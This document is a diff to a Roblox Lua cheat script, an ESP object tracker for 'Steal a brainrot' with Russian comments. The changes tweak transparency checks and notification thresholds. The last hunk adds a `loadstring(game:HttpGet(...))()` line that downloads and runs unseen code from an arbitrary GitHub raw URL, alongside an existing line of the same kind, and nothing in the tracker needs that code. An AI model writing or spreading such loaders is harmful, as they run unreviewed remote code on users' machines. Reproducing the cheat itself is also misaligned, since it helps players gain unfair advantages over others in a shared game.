@@ -380,8 +380,20 @@ local function findTraits(obj)
     return traits
 end
 
+
 local function scanObject(obj)
     if not obj or not obj.Parent then return nil end
+    
+    -- Пропуск проверки прозрачности для "Garama and Madundung" и "La Supreme Combinasion"
+    if obj.Name == "Garama and Madundung" or obj.Name == "La Supreme Combinasion" then
+        print(obj.Name .. ": проверка прозрачности пропущена")
+    else
+        -- Проверка прозрачности только для частей Cube.
+        if not checkCubeTransparency(obj) then
+            print(obj.Name .. ": найдены части Cube с высокой прозрачностью (>0.40), уведомление не отправляется")
+            return nil
+        end
+    end
     
     local mutation = findMutation(obj)
     local traits = findTraits(obj)
@@ -691,13 +703,15 @@ local function updateESP(deltaTime)
             if not espCache[obj] then
                 espCache[obj] = createESPElement(obj)
                 local objData = espCache[obj].data
-                playDetectionSound()
-                
-                -- Добавляем в соответствующий список для уведомлений
-                if TG_MAIN.ImportantObjects[obj.Name] or objData.numericIncome >= 10000000 then
-                    table.insert(objectsToNotifyMain, objData)
-                else
-                    table.insert(objectsToNotifySpecial, objData)
+                if objData then
+                    playDetectionSound()
+                    
+                    -- Добавляем в соответствующий список для уведомлений
+                    if TG_MAIN.ImportantObjects[obj.Name] or objData.numericIncome >= 25000000 then
+                        table.insert(objectsToNotifyMain, objData)
+                    else
+                        table.insert(objectsToNotifySpecial, objData)
+                    end
                 end
             end
 
@@ -778,4 +792,5 @@ print("Steal a brainrot ESP System активирован!")
 print("Отслеживается объектов: "..#OBJECT_NAMES)
 print("ID сервера:", getServerId())
 print("\nНажмите F для сканирования всех объектов")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ldkoedkeo/eblan2222/refs/heads/main/noob.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/valkiri61-cloud/dsfsdf/refs/heads/main/dfesdf.lua"))()
